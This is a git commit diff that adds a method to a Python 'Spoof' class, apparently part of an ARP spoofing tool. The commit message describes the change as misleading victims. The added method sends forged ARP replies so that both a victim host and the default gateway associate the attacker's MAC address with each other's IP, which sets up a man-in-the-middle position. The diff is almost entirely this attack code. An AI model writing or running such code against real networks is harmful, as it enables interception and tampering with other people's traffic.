247464fce7915a9ff7cb0f560b6086d24126fd3c
Ariel-Kakuriev <ariel.kakuriev@gmail.com>
2025-06-30 21:44:34 +0300

    Build a function that misleading the victims by ARP-Spoofing

--- src/spoofer.py
+++ src/spoofer.py
@@ -1,4 +1,6 @@
-from utils import get_our_mac_addr, get_default_gateway_ip, get_mac_addr
+from utils import get_our_mac_addr, get_default_gateway_ip, get_mac_addr, send_arp_packet
+
+ARP_REPLY_OPCODE = 2
 
 class Spoof:
     def __init__(self, victim_ip: str):
@@ -7,3 +9,14 @@ class Spoof:
         self.__victim_mac = get_mac_addr(self.__victim_ip)  # Get MAC of victim
         self.__default_gateway_ip = get_default_gateway_ip()  # Get IP of default gateway
         self.__default_gateway_mac = get_mac_addr(self.__default_gateway_ip)  # Get MAC of default gateway
+
+    """
+    This function misleading the victims by ARP-Spoofing
+    Input: self.
+    Output: None
+    """
+    def __spoof(self) -> None:
+        # Make the default gateway think that I'm the victim
+        send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__victim_ip, self.__default_gateway_mac, self.__default_gateway_ip)
+        # Make the victim think that I'm the default gateway
+        send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__default_gateway_ip, self.__victim_mac, self.__victim_ip)
